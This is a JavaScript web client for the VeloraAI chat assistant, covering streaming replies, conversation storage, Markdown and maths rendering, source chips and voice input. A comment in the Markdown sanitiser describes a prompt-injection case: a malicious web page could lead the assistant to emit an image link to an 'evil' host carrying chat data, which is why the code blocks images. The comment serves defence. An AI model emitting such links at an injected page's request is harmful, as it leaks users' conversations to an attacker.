// VeloraAI - web client.
// Talks to the C++ backend, which streams the reply as Server-Sent Events:
//   {type:"status", text}   Velora is using a tool ("Searching the web: ...")
//   {type:"sources", sources:[{title,url}]}
//   {type:"delta", text}    next piece of the answer
//   {type:"error", text}    something went wrong
//   {type:"done"}

const API_BASE = location.protocol === "file:" ? "http://localhost:8080" : "";
const STORAGE_KEY = "velora.conversations.v1";

const $ = id => document.getElementById(id);
const chatArea = $("chatArea");
const messagesElement = $("messages");
const input = $("messageInput");
const welcome = $("welcome");
const sendButton = $("sendButton");
const micButton = $("micButton");
const historyElement = $("history");
const toastElement = $("toast");

let conversations = [];
let currentConversationId = null;
let busy = false;
let abortController = null;
let toastTimer;
let stickToBottom = true;

// ---------------------------------------------------------------- storage

function loadState() {
    try {
        const saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || "null");
        if (saved && Array.isArray(saved.conversations)) {
            conversations = saved.conversations.filter(c => c && Array.isArray(c.messages));
            currentConversationId = saved.current;
        }
    } catch { /* storage blocked or corrupt: start fresh */ }
}

let saveTimer;
function saveNow() {
    clearTimeout(saveTimer);
    try {
        // Keep the 60 most recent conversations.
        conversations = conversations.slice(0, 60);
        localStorage.setItem(STORAGE_KEY, JSON.stringify({
            conversations,
            current: currentConversationId
        }));
    } catch { /* quota exceeded or blocked: ignore */ }
}

function saveState() {
    clearTimeout(saveTimer);
    saveTimer = setTimeout(saveNow, 200);
}

// Never lose the last message if the tab is closed or reloaded right away.
window.addEventListener("pagehide", saveNow);
document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden") saveNow();
});

// ---------------------------------------------------------- conversations

function createConversation() {
    const conversation = {
        id: Date.now().toString() + Math.random().toString(36).slice(2, 7),
        title: "New conversation",
        messages: []
    };
    conversations.unshift(conversation);
    currentConversationId = conversation.id;
    renderHistory();
    renderMessages();
    saveState();
    return conversation;
}

function getCurrentConversation() {
    return conversations.find(c => c.id === currentConversationId);
}

function newChat() {
    if (busy) return;
    const current = getCurrentConversation();
    if (current && current.messages.length === 0) {   // reuse an empty chat
        input.focus();
        toggleSidebar(false);
        return;
    }
    createConversation();
    input.focus();
    toggleSidebar(false);
}

function deleteConversation(id) {
    if (busy) return;
    conversations = conversations.filter(c => c.id !== id);
    if (id === currentConversationId) {
        currentConversationId = conversations.length ? conversations[0].id : null;
        if (!currentConversationId) createConversation();
    }
    renderHistory();
    renderMessages();
    saveState();
}

function renderHistory() {
    historyElement.replaceChildren();

    conversations.forEach(conversation => {
        const item = document.createElement("div");
        item.className = "history-item" +
            (conversation.id === currentConversationId ? " active" : "");

        const icon = document.createElement("span");
        icon.textContent = "◷";

        const title = document.createElement("span");
        title.className = "history-title";
        title.textContent = conversation.title;

        const del = document.createElement("button");
        del.className = "history-delete";
        del.textContent = "×";
        del.title = "Delete conversation";
        del.setAttribute("aria-label", "Delete conversation");
        del.addEventListener("click", event => {
            event.stopPropagation();
            deleteConversation(conversation.id);
        });

        item.append(icon, title, del);

        item.addEventListener("click", () => {
            if (busy) return;
            currentConversationId = conversation.id;
            renderHistory();
            renderMessages();
            saveState();
            toggleSidebar(false);
        });

        historyElement.appendChild(item);
    });
}

function renderMessages() {
    const conversation = getCurrentConversation();
    messagesElement.replaceChildren();

    const isEmpty = !conversation || conversation.messages.length === 0;
    welcome.style.display = isEmpty ? "block" : "none";
    if (!conversation) return;

    const last = conversation.messages.length - 1;
    conversation.messages.forEach((message, index) => {
        const row = buildRow(message.role);
        if (message.role === "user") {
            row.content.textContent = message.content;
        } else {
            setSteps(row, message.steps);
            renderAssistantContent(row.content, message.content);
            setSources(row, message.sources);
            addAssistantActions(row, message.content, index === last);
        }
    });
    stickToBottom = true;
    scrollToBottom(true);
}

// ------------------------------------------------------------ message rows

function buildRow(role) {
    const row = document.createElement("div");
    row.className = `message ${role}`;

    const avatar = document.createElement("div");
    avatar.className = "message-avatar";
    avatar.textContent = role === "user" ? "Y" : "✦";

    const body = document.createElement("div");
    body.className = "message-body";

    const name = document.createElement("div");
    name.className = "message-role";
    name.textContent = role === "user" ? "You" : "VeloraAI";

    body.appendChild(name);

    const parts = { row, body };

    if (role === "assistant") {
        parts.steps = document.createElement("div");
        parts.steps.className = "steps";
        parts.steps.hidden = true;
        body.appendChild(parts.steps);
    }

    parts.content = document.createElement("div");
    parts.content.className = "message-content" + (role === "assistant" ? " md" : "");
    body.appendChild(parts.content);

    if (role === "assistant") {
        parts.sources = document.createElement("div");
        parts.sources.className = "sources";
        parts.sources.hidden = true;
        body.appendChild(parts.sources);
    }

    row.append(avatar, body);
    messagesElement.appendChild(row);
    return parts;
}

function setSteps(parts, steps, activeText) {
    parts.steps.replaceChildren();
    const list = steps || [];
    list.forEach(text => {
        const el = document.createElement("div");
        el.className = "step done";
        el.textContent = "✓ " + text;
        parts.steps.appendChild(el);
    });
    if (activeText) {
        const el = document.createElement("div");
        el.className = "step active";
        el.textContent = activeText + "…";
        parts.steps.appendChild(el);
    }
    parts.steps.hidden = list.length === 0 && !activeText;
}

function hostOf(url) {
    try { return new URL(url).hostname.replace(/^www\./, ""); } catch { return url; }
}

function setSources(parts, sources) {
    parts.sources.replaceChildren();
    if (!sources || !sources.length) { parts.sources.hidden = true; return; }

    const label = document.createElement("span");
    label.className = "sources-label";
    label.textContent = "Sources";
    parts.sources.appendChild(label);

    sources.forEach((source, i) => {
        if (!/^https?:\/\//i.test(source.url)) return;
        const a = document.createElement("a");
        a.className = "source-chip";
        a.href = source.url;
        a.target = "_blank";
        a.rel = "noopener noreferrer";
        a.title = source.title || source.url;
        a.textContent = `${i + 1} · ${hostOf(source.url)}`;
        parts.sources.appendChild(a);
    });
    parts.sources.hidden = false;
}

function addAssistantActions(parts, content, isLast) {
    parts.body.querySelector(".message-actions")?.remove();

    const actions = document.createElement("div");
    actions.className = "message-actions";

    const copy = document.createElement("button");
    copy.textContent = "Copy";
    copy.onclick = async () => {
        try {
            await navigator.clipboard.writeText(content);
            showToast("Response copied");
        } catch {
            showToast("Copy failed. Select the response to copy it.");
        }
    };
    actions.appendChild(copy);

    if (isLast) {
        const again = document.createElement("button");
        again.textContent = "↻ Regenerate";
        again.onclick = regenerate;
        actions.appendChild(again);
    }
    parts.body.appendChild(actions);
}

// -------------------------------------------------------------- Markdown

// Maths is pulled out before Markdown runs (so _ and * inside formulas are
// left alone) and put back as KaTeX afterwards.
function extractMath(src, store) {
    const stash = (tex, display) => {
        store.push({ tex, display });
        return `NMATHPH${store.length - 1}PH`;
    };
    return src.split(/(```[\s\S]*?(?:```|$)|`[^`\n]*`)/).map((part, i) => {
        if (i % 2 === 1) return part;                        // code: untouched
        return part
            .replace(/\$\$([\s\S]+?)\$\$/g, (_, t) => stash(t, true))
            .replace(/\\\[([\s\S]+?)\\\]/g, (_, t) => stash(t, true))
            .replace(/\\\(([\s\S]+?)\\\)/g, (_, t) => stash(t, false))
            .replace(/(?<![\\$\w])\$(?!\s)([^$\n]+?)(?<!\s)\$(?![\d\w])/g, (_, t) => stash(t, false));
    }).join("");
}

function markdownToSafeHtml(text) {
    const maths = [];
    const withoutMath = extractMath(text, maths);

    let html = marked.parse(withoutMath, { gfm: true, breaks: true });
    // Images are blocked on purpose: a malicious web page Velora reads could otherwise make
    // it emit ![x](https://evil/?data=...) and leak parts of your chat when the image loads.
    html = DOMPurify.sanitize(html, {
        ADD_ATTR: ["target"],
        FORBID_TAGS: ["img", "picture", "source", "video", "audio", "iframe", "style", "form"]
    });

    if (maths.length) {
        html = html.replace(/NMATHPH(\d+)PH/g, (match, n) => {
            const m = maths[Number(n)];
            if (!m) return match;
            if (window.katex) {
                try {
                    return katex.renderToString(m.tex.trim(), {
                        displayMode: m.display, throwOnError: false
                    });
                } catch { /* fall through */ }
            }
            const escaped = m.tex.replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
            return m.display ? `$$${escaped}$$` : `$${escaped}$`;
        });
    }
    return html;
}

function enhanceBlocks(container) {
    container.querySelectorAll("a").forEach(a => {
        a.target = "_blank";
        a.rel = "noopener noreferrer";
    });

    container.querySelectorAll("table").forEach(table => {
        const wrap = document.createElement("div");
        wrap.className = "table-wrap";
        table.replaceWith(wrap);
        wrap.appendChild(table);
    });

    container.querySelectorAll("pre").forEach(pre => {
        const code = pre.querySelector("code");
        if (!code) return;
        const lang = ((code.className.match(/language-([\w+#-]+)/) || [])[1] || "").toLowerCase();

        if (window.hljs) {
            try {
                if (lang && hljs.getLanguage(lang)) hljs.highlightElement(code);
                else if (!lang) hljs.highlightElement(code);
            } catch { /* leave uncoloured */ }
        }

        const wrap = document.createElement("div");
        wrap.className = "codeblock";
        const head = document.createElement("div");
        head.className = "codeblock-head";
        const label = document.createElement("span");
        label.textContent = lang || "code";
        const copy = document.createElement("button");
        copy.className = "code-copy";
        copy.textContent = "Copy";
        head.append(label, copy);

        pre.replaceWith(wrap);
        wrap.append(head, pre);
    });
}

function renderAssistantContent(el, text) {
    if (window.marked && window.DOMPurify) {
        try {
            el.innerHTML = markdownToSafeHtml(text);
            enhanceBlocks(el);
            return;
        } catch (error) {
            console.warn("Markdown rendering failed, showing plain text:", error);
        }
    }
    // Libraries not loaded (offline): plain, safe text.
    el.textContent = text;
    el.style.whiteSpace = "pre-wrap";
}

// Copy buttons inside code blocks (event delegation: blocks are re-rendered while streaming).
messagesElement.addEventListener("click", async event => {
    const button = event.target.closest(".code-copy");
    if (!button) return;
    const code = button.closest(".codeblock").querySelector("code");
    try {
        await navigator.clipboard.writeText(code.textContent);
        button.textContent = "Copied ✓";
        setTimeout(() => { button.textContent = "Copy"; }, 1500);
    } catch {
        showToast("Copy failed. Select the code to copy it.");
    }
});

// ---------------------------------------------------------------- scrolling

chatArea.addEventListener("scroll", () => {
    stickToBottom = chatArea.scrollHeight - chatArea.scrollTop - chatArea.clientHeight < 120;
});

function scrollToBottom(force = false) {
    if (force || stickToBottom) chatArea.scrollTop = chatArea.scrollHeight;
}

// ----------------------------------------------------------------- sending

function usePrompt(prompt) {
    input.value = prompt;
    input.focus();
    sendMessage();
}

function onSendClick() {
    if (busy) stopGenerating();
    else sendMessage();
}

function setBusy(value) {
    busy = value;
    sendButton.textContent = value ? "■" : "↑";
    sendButton.title = value ? "Stop generating" : "Send";
    sendButton.setAttribute("aria-label", value ? "Stop generating" : "Send message");
    sendButton.classList.toggle("stop", value);
}

function stopGenerating() {
    if (abortController) abortController.abort();
}

async function sendMessage() {
    const message = input.value.trim();
    if (!message || busy) return;

    if (!currentConversationId || !getCurrentConversation()) createConversation();
    const conversation = getCurrentConversation();
    conversation.messages.push({ role: "user", content: message });

    if (conversation.title === "New conversation") {
        conversation.title = message.length > 40 ? message.slice(0, 40) + "…" : message;
    }

    input.value = "";
    input.style.height = "auto";
    welcome.style.display = "none";

    const row = buildRow("user");
    row.content.textContent = message;
    renderHistory();
    saveState();

    stickToBottom = true;
    scrollToBottom(true);
    await streamReply(conversation);
}

async function regenerate() {
    if (busy) return;
    const conversation = getCurrentConversation();
    if (!conversation) return;
    while (conversation.messages.length &&
           conversation.messages[conversation.messages.length - 1].role === "assistant") {
        conversation.messages.pop();
    }
    if (!conversation.messages.length) return;
    renderMessages();
    saveState();
    await streamReply(conversation);
}

async function streamReply(conversation) {
    const parts = buildRow("assistant");
    parts.content.classList.add("typing");
    parts.content.textContent = "VeloraAI is thinking…";

    const steps = [];
    let sources = [];
    let answer = "";
    let failure = null;
    let started = false;
    let renderQueued = false;

    const paint = () => {
        renderQueued = false;
        renderAssistantContent(parts.content, answer);
        scrollToBottom();
    };
    const schedulePaint = () => {
        if (!renderQueued) { renderQueued = true; setTimeout(paint, 60); }
    };

    setBusy(true);
    abortController = new AbortController();
    scrollToBottom(true);

    try {
        const response = await fetch(API_BASE + "/chat", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            signal: abortController.signal,
            body: JSON.stringify({
                messages: conversation.messages.map(m => ({ role: m.role, content: m.content }))
            })
        });

        if (!response.ok) {
            let detail = `Server returned HTTP ${response.status}`;
            try { detail = (await response.json()).error || detail; } catch { /* keep default */ }
            throw new Error(detail);
        }

        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let buffer = "";
        let activeStep = null;

        const finishActiveStep = () => {
            if (activeStep) { steps.push(activeStep); activeStep = null; }
        };

        const handle = event => {
            if (event.type === "status") {
                finishActiveStep();
                activeStep = event.text;
                setSteps(parts, steps, activeStep);
            } else if (event.type === "sources") {
                sources = sources.concat(event.sources.filter(s => !sources.some(o => o.url === s.url)));
                setSources(parts, sources);
            } else if (event.type === "delta") {
                if (!started) {
                    started = true;
                    parts.content.classList.remove("typing");
                }
                finishActiveStep();
                setSteps(parts, steps);
                answer += event.text;
                schedulePaint();
            } else if (event.type === "error") {
                failure = event.text;
            }
        };

        for (;;) {
            const { value, done } = await reader.read();
            if (done) break;
            buffer += decoder.decode(value, { stream: true });

            let end;
            while ((end = buffer.indexOf("\n\n")) >= 0) {
                const chunk = buffer.slice(0, end);
                buffer = buffer.slice(end + 2);
                const line = chunk.split("\n").find(l => l.startsWith("data:"));
                if (!line) continue;
                try { handle(JSON.parse(line.slice(5))); } catch { /* ignore bad chunk */ }
            }
        }
        if (activeStep) steps.push(activeStep);
    } catch (error) {
        if (error.name !== "AbortError") {
            failure = error instanceof TypeError
                ? "I couldn't reach the Velora backend. Make sure the backend program is running (see README), then press Retry."
                : String(error.message || error);
            console.error("Chat request failed:", error);
            checkHealth();
        }
    }

    parts.content.classList.remove("typing");
    setBusy(false);
    abortController = null;

    // Final render of whatever arrived.
    if (answer) renderAssistantContent(parts.content, answer);

    if (failure && !answer) {
        showError(parts, failure);
        parts.steps.hidden = true;
    } else if (!answer) {
        parts.row.remove();                      // stopped before any text
    } else {
        if (failure) showToast(failure);
        conversation.messages.push({
            role: "assistant",
            content: answer,
            sources: sources.length ? sources : undefined,
            steps: steps.length ? steps : undefined
        });
        setSteps(parts, steps);
        addAssistantActions(parts, answer, true);
        // Older "Regenerate" buttons are no longer valid.
        messagesElement.querySelectorAll(".message.assistant").forEach(row => {
            if (row !== parts.row) {
                const btn = [...row.querySelectorAll(".message-actions button")]
                    .find(b => b.textContent.includes("Regenerate"));
                btn?.remove();
            }
        });
    }
    saveState();
    scrollToBottom();
    input.focus();
}

function showError(parts, text) {
    parts.content.classList.remove("md");
    parts.content.classList.add("error");
    parts.content.textContent = "⚠ " + text;

    const actions = document.createElement("div");
    actions.className = "message-actions";
    const retry = document.createElement("button");
    retry.textContent = "↻ Retry";
    retry.onclick = () => {
        parts.row.remove();
        const conversation = getCurrentConversation();
        if (conversation) streamReply(conversation);
    };
    actions.appendChild(retry);
    parts.body.appendChild(actions);
}

// --------------------------------------------------------------- misc UI

function clearChat() {
    if (busy) return;
    const conversation = getCurrentConversation();
    if (!conversation) return;

    conversation.messages = [];
    conversation.title = "New conversation";

    renderMessages();
    renderHistory();
    saveState();
    showToast("Conversation cleared");
}

function exportChat() {
    const conversation = getCurrentConversation();
    if (!conversation || !conversation.messages.length) {
        showToast("Nothing to export yet");
        return;
    }
    const text = `# ${conversation.title}\n\n` + conversation.messages.map(m =>
        `**${m.role === "user" ? "You" : "VeloraAI"}**\n\n${m.content}` +
        (m.sources?.length ? "\n\nSources:\n" + m.sources.map(s => `- ${s.title} - ${s.url}`).join("\n") : "")
    ).join("\n\n---\n\n") + "\n";

    const url = URL.createObjectURL(new Blob([text], { type: "text/markdown" }));
    const a = document.createElement("a");
    a.href = url;
    a.download = (conversation.title.replace(/[^\w\- ]+/g, "").trim() || "velora-chat") + ".md";
    a.click();
    URL.revokeObjectURL(url);
}

function toggleSidebar(force) {
    const sidebar = $("sidebar");
    if (typeof force === "boolean") sidebar.classList.toggle("open", force);
    else sidebar.classList.toggle("open");
}

function showToast(message) {
    toastElement.textContent = message;
    toastElement.classList.add("show");
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toastElement.classList.remove("show"), 2600);
}

// ----------------------------------------------------------- backend status

let healthy = false;

async function checkHealth() {
    const banner = $("banner");
    try {
        const response = await fetch(API_BASE + "/health");
        const info = await response.json();
        healthy = true;
        $("statusDot").style.background = $("onlineDot").style.background = "#59d9a0";
        $("sideStatus").textContent = "Online · " + info.model;
        $("modelTag").textContent = info.model.toUpperCase();

        if (!info.configured) {
            banner.hidden = false;
            banner.textContent = "⚠ No API key found. Set OPENAI_API_KEY and restart the backend (see README).";
        } else {
            banner.hidden = true;
        }
    } catch {
        healthy = false;
        $("statusDot").style.background = $("onlineDot").style.background = "#f06a6a";
        $("sideStatus").textContent = "Backend offline";
        banner.hidden = false;
        banner.textContent = "⚠ The Velora backend isn't running. Start it (see README) and this page will reconnect.";
    }
}

// ------------------------------------------------------------ voice input

const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
let recognizer = null;

function toggleMic() {
    if (!SpeechRecognition) return;
    if (recognizer) { recognizer.stop(); return; }

    recognizer = new SpeechRecognition();
    recognizer.lang = navigator.language || "en-US";
    recognizer.interimResults = true;
    const base = input.value ? input.value.trimEnd() + " " : "";

    recognizer.onresult = event => {
        let text = "";
        for (const result of event.results) text += result[0].transcript;
        input.value = base + text;
        input.dispatchEvent(new Event("input"));
    };
    recognizer.onend = () => {
        recognizer = null;
        micButton.classList.remove("listening");
    };
    recognizer.onerror = () => showToast("Could not use the microphone.");
    micButton.classList.add("listening");
    try { recognizer.start(); } catch { recognizer = null; micButton.classList.remove("listening"); }
}

if (SpeechRecognition) micButton.hidden = false;

// ------------------------------------------------------------------ events

input.addEventListener("keydown", event => {
    if (event.key === "Enter" && !event.shiftKey && !event.isComposing) {
        event.preventDefault();
        sendMessage();
    }
});

input.addEventListener("input", () => {
    input.style.height = "auto";
    input.style.height = Math.min(input.scrollHeight, 180) + "px";
});

document.addEventListener("keydown", event => {
    if (event.key === "Escape" && busy) stopGenerating();
    if ((event.ctrlKey || event.metaKey) && event.key.toLowerCase() === "k") {
        event.preventDefault();
        newChat();
    }
});

// -------------------------------------------------------------------- start

loadState();
if (!conversations.length) createConversation();
else {
    if (!getCurrentConversation()) currentConversationId = conversations[0].id;
    renderHistory();
    renderMessages();
}
checkHealth();
// Reconnect quickly when the backend is down; otherwise check every 30 s.
let healthTick = 0;
setInterval(() => {
    if (!busy && (!healthy || ++healthTick % 6 === 0)) checkHealth();
}, 5000);
